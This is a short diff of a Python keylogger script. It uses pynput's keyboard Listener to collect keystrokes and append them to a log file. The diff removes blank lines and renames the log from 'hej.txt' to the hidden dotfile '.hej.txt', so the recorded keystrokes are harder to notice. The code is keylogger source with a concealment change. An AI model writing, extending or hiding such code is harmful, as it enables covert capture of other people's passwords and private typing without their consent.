@@ -6,9 +6,6 @@ subprocess.check_call([sys.executable, '-m', 'pip', 'install',
 
 from pynput.keyboard import Key, Listener
 
-
-
-
 count = 0
 tangs = []
 
@@ -31,7 +28,7 @@ def on_tryck(tang):
 
 def write_file(tangs):
     #Change to w-flag for new file
-    with open("hej.txt", "a") as f:
+    with open(".hej.txt", "a") as f:
         for tang in tangs:
             k = str(tang).replace("'","")
             #If space/enter key, make more usable
